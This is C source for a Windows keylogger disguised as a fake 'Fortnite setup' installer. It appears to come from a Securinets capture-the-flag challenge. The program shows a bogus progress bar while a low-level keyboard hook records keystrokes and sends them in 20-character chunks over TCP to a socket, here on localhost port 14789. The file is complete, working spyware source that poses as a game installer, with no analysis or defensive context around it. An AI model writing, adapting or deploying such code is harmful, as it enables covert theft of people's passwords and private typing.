#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <string.h>
#include <time.h>

HHOOK hHook;
char buffer[21];
int count = 0;

void logk(int vkCode);
void sendlog(const char *message);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI fortnite(LPVOID lpParam);

void logk(int vkCode) {
    WCHAR keyName[2] = {0};
    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);

    HKL layout = GetKeyboardLayout(0);
    int result = ToUnicode(vkCode, 0, keyboardState, keyName, 2, 0);

    if (result > 0) {
        buffer[count++] = keyName[0];
    } else {
        switch (vkCode) {
            case VK_SPACE: buffer[count++] = ' '; break;
            case VK_TAB: buffer[count++] = '\t'; break;
            case VK_RETURN: buffer[count++] = '\n'; break;
            case VK_BACK: buffer[count++] = '\b'; break;
            default: buffer[count++] = '?'; break;
        }
    }

    if (count >= 20 || strstr(buffer, "securinets") != NULL) {
        buffer[count] = '\0';

        if (strstr(buffer, "securinets") != NULL) {
            sendlog("I_Saw_What_You_Typed_There");
        } else {
            sendlog(buffer);
        }

        count = 0; 
        memset(buffer, 0, sizeof(buffer));
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        logk(kbd->vkCode);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void sendlog(const char *message) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Could not create socket! Error: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(14789);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    send(sock, message, strlen(message), 0);

    closesocket(sock);
    WSACleanup();
}

DWORD WINAPI fortnite(LPVOID lpParam) {
    printf("Fortnite setup:\n\n");
    int progress = 0;
    while (progress <= 100) {
        printf("\r[%-50s] %d%%", "==================================================" + (50 - progress / 2), progress);
        fflush(stdout);
        Sleep(1000);
        progress++;
    }

    printf("\nInstallation Complete!\n");
    return 0;
}

int main() {
    HANDLE hThread = CreateThread(NULL, 0, fortnite, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create installation progress thread!\n");
        return 1;
    }

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        printf("Failed to set hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
